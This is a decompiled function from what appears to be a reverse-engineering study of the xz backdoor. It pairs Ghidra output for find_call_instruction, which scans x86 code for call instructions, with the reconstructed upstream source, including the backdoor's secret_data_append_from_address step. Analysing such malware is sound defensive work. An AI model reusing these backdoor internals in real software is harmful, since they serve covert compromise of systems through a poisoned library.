// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)
/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief finds a call instruction
 *
 *   @param code_start address to start searching from
 *   @param code_end address to stop searching at
 *   @param call_target optional call target address. pass 0 to find any call
 *   @param dctx empty disassembler context to hold the state
 *   @return BOOL TRUE if found, FALSE otherwise
 *
 * Upstream implementation excerpt (xzre/xzre_code/find_call_instruction.c):
 *     BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx){
 *     	if(!secret_data_append_from_address(NULL, (secret_data_shift_cursor_t){ 0x81 }, 4, 7)){
 *     		return FALSE;
 *     	}
 *     	dasm_ctx_t ctx = {0};
 *     	if(!dctx){
 *     		dctx = &ctx;
 *     	}
 *     
 *     	while(code_start < code_end){
 *     		if(x86_dasm(dctx, code_start, code_end)){
 *     			if(XZDASM_OPC(dctx->opcode) == X86_OPCODE_CALL
 *     				&& (!call_target || &dctx->instruction[dctx->operand + dctx->instruction_size] == call_target)
 *     			){
 *     				return TRUE;
 *     			}
 *     			code_start += dctx->instruction_size;
 *     		} else {
 *     			code_start += 1;
 *     		}
 *     	}
 *     	return FALSE;
 *     }
 *     
 */

BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  byte bVar5;
  dasm_ctx_t ctx;
  
  bVar5 = 0;
  BVar2 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (BVar2 != 0) {
    pdVar4 = &ctx;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)&pdVar4->instruction = 0;
      pdVar4 = (dasm_ctx_t *)((long)pdVar4 + ((ulong)bVar5 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &ctx;
    }
    while (code_start < code_end) {
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if (BVar2 == 0) {
        code_start = code_start + 1;
      }
      else {
        iVar1._0_1_ = dctx->_unknown810[0];
        iVar1._1_1_ = dctx->_unknown810[1];
        iVar1._2_1_ = dctx->_unknown810[2];
        iVar1._3_1_ = dctx->field_0x2b;
        if ((iVar1 == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->mem_disp == call_target)))) {
          return 1;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return 0;
}

